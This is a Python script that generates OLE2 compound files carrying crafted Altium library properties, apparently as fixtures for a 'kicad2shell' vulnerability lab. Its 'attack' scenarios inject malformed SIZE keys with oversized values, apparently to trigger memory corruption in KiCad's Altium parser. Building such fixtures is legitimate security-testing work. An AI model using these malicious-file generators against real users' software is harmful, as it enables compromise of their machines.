#!/usr/bin/env python3
"""Build a minimal but structurally valid MS-CFB (OLE2) v3 compound file whose
FileHeader stream carries the crafted Altium property bytes.

This is fixture provisioning for the kicad2shell real-compound-file lane.  The
output is a real CFB byte stream: header + FAT + directory + miniFAT + mini
stream.  `olefile` read-back (see verify_cfb.py) is the independent proof that
the bytes are a genuine compound file and that FileHeader is a real stream.

No KiCad source or wxWidgets is used here; this only replaces the lab
"pre-built stream bytes" shim with a real compound-file container.
"""
import struct
import sys

SECTOR = 512
MINISECTOR = 64
FREESECT = 0xFFFFFFFF
ENDOFCHAIN = 0xFFFFFFFE
FATSECT = 0xFFFFFFFD
NOSTREAM = 0xFFFFFFFF

HEADER_TEXT = b"Protel for Windows - Schematic Library Editor Binary File Version 5.0"


def prop_stream(scenario):
    """The FileHeader stream bytes ReadProperties() consumes: uint32 prefix +
    '|KEY=value|...' payload ending in a NUL, exactly as the realparser lane."""
    payload = b"|HEADER=" + HEADER_TEXT + b"|SIZE1=10"
    if scenario == "attackz":
        payload += b"|SIZEZ=84215045"
    elif scenario == "attackneg":
        payload += b"|SIZE-1=84215045"
    elif scenario == "attackfar":
        payload += b"|SIZE+1=10|SIZE-1=84215045"
    elif scenario != "baseline":
        raise SystemExit("usage: make_cfb.py OUT baseline|attackz|attackneg|attackfar")
    payload += b"|\x00"
    return struct.pack("<I", len(payload)) + payload


def dirent(name, otype, color, left, right, child, start, size):
    nm = name.encode("utf-16-le") + b"\x00\x00"
    e = bytearray(128)
    e[0:len(nm)] = nm
    struct.pack_into("<H", e, 64, len(nm))       # name length incl NUL
    e[66] = otype
    e[67] = color
    struct.pack_into("<III", e, 68, left, right, child)
    # CLSID (80..95), state (96..99), times (100..115) left zero
    struct.pack_into("<I", e, 116, start)   # starting sector / mini-sector
    struct.pack_into("<Q", e, 120, size)    # stream size (bytes)
    return bytes(e)


def build(stream):
    nmini = max(1, (len(stream) + MINISECTOR - 1) // MINISECTOR)
    mini_stream_len = nmini * MINISECTOR

    # Sector layout: 0 directory, 1 miniFAT, 2 mini stream, 3 FAT.
    DIR, MINIFAT, MINISTREAM, FATSEC = 0, 1, 2, 3

    # Directory sector: root entry + FileHeader + two unused entries.
    directory = b"".join([
        dirent("Root Entry", 5, 1, NOSTREAM, NOSTREAM, 1, MINISTREAM, mini_stream_len),
        dirent("FileHeader", 2, 1, NOSTREAM, NOSTREAM, NOSTREAM, 0, len(stream)),
        dirent("", 0, 0, NOSTREAM, NOSTREAM, NOSTREAM, 0, 0),
        dirent("", 0, 0, NOSTREAM, NOSTREAM, NOSTREAM, 0, 0),
    ])
    assert len(directory) == SECTOR

    # miniFAT: one chain of nmini mini sectors, rest free.
    mf = [FREESECT] * (SECTOR // 4)
    for i in range(nmini):
        mf[i] = i + 1 if i + 1 < nmini else ENDOFCHAIN
    minifat = b"".join(struct.pack("<I", x) for x in mf)

    # mini stream: stream bytes padded to a whole number of mini sectors.
    ministream = ( stream + b"\x00" * ( mini_stream_len - len( stream ) ) ).ljust( SECTOR, b"\x00" )

    # FAT: four allocated sectors, each a terminal chain; FAT sector marked.
    fat = [FREESECT] * (SECTOR // 4)
    fat[DIR] = ENDOFCHAIN
    fat[MINIFAT] = ENDOFCHAIN
    fat[MINISTREAM] = ENDOFCHAIN
    fat[FATSEC] = FATSECT
    fat_sector = b"".join(struct.pack("<I", x) for x in fat)

    # 512-byte CFB header.
    h = bytearray(SECTOR)
    h[0:8] = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"
    struct.pack_into("<H", h, 24, 0x003E)       # minor version
    struct.pack_into("<H", h, 26, 0x0003)       # major version (v3)
    struct.pack_into("<H", h, 28, 0xFFFE)       # little endian
    struct.pack_into("<H", h, 30, 9)            # sector shift -> 512
    struct.pack_into("<H", h, 32, 6)            # mini sector shift -> 64
    struct.pack_into("<I", h, 40, 0)            # #dir sectors (v3 = 0)
    struct.pack_into("<I", h, 44, 1)            # #FAT sectors
    struct.pack_into("<I", h, 48, DIR)          # first directory sector
    struct.pack_into("<I", h, 52, 0)            # transaction signature
    struct.pack_into("<I", h, 56, 0x1000)       # mini stream cutoff
    struct.pack_into("<I", h, 60, MINIFAT)      # first miniFAT sector
    struct.pack_into("<I", h, 64, 1)            # #miniFAT sectors
    struct.pack_into("<I", h, 68, ENDOFCHAIN)   # first DIFAT sector
    struct.pack_into("<I", h, 72, 0)            # #DIFAT sectors
    difat = [FREESECT] * 109
    difat[0] = FATSEC
    for i, x in enumerate(difat):
        struct.pack_into("<I", h, 76 + 4 * i, x)
    return bytes(h) + directory + minifat + ministream + fat_sector


def main():
    if len(sys.argv) != 3:
        raise SystemExit("usage: make_cfb.py OUT baseline|attackz|attackneg|attackfar")
    out, scenario = sys.argv[1], sys.argv[2]
    with open(out, "wb") as f:
        f.write(build(prop_stream(scenario)))
    print("wrote %s (%d bytes) scenario=%s" % (out, len(build(prop_stream(scenario))), scenario))


if __name__ == "__main__":
    main()
